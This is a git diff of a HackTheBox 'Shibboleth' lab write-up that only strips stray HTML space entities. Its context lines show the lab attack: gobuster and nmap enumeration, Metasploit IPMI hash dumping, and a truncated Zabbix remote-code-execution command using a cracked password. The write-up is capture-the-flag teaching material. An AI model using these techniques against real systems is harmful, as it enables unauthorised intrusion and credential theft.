@@ -14,7 +14,7 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-We have to add `shibboleth.htb` to our `/etc/hosts` file before we can view the web application.&#x20;
+We have to add `shibboleth.htb` to our `/etc/hosts` file before we can view the web application.
 
 ### FlexStart -> Bare Metal BMC
 
@@ -49,7 +49,7 @@ All 3 subdomains all pointed to the same place. The `zabbix` instance required c
 
 <figure><img src="../../../.gitbook/assets/image (1631).png" alt=""><figcaption></figcaption></figure>
 
-&#x20;A directory scan with `gobuster` does show some directories, but there weren't anything in them.
+A directory scan with `gobuster` does show some directories, but there weren't anything in them.
 
 ```
 $ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://shibboleth.htb -t 100 
@@ -75,7 +75,7 @@ Progress: 217816 / 220561 (98.76%)==============================================
 ===============================================================
 ```
 
-Since there weren't many leads, I searched a bit more on the Bare Metal BMC Automation thing, because it looked as if it was intentionally left there since the rest of the site is basically Lorem Ipsum.&#x20;
+Since there weren't many leads, I searched a bit more on the Bare Metal BMC Automation thing, because it looked as if it was intentionally left there since the rest of the site is basically Lorem Ipsum.
 
 Searching on Hacktricks for Bare Metal BMC reveals that it opens port 623 for UDP traffic using the IPMI protocol.
 
@@ -110,7 +110,7 @@ msf6 auxiliary(scanner/ipmi/ipmi_version) > run
 [*] Auxiliary module execution completed
 ```
 
-Then, we can try the dump hashes method on this. Metasploit has a built in wordlist to use for it.&#x20;
+Then, we can try the dump hashes method on this. Metasploit has a built in wordlist to use for it.
 
 ```
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS shibboleth.htb
@@ -162,7 +162,7 @@ $ python3 rce.py http://zabbix.shibboleth.htb Administrator ilovepumkinpie1 10.1
 
 ## Privilege Escalation
 
-We cannot read the user flag from the `ipmi-svc` user yet, so we can first enumerate processes or any misconfigurations left behind by the user.&#x20;
+We cannot read the user flag from the `ipmi-svc` user yet, so we can first enumerate processes or any misconfigurations left behind by the user.
 
 ### Credential Reuse
 
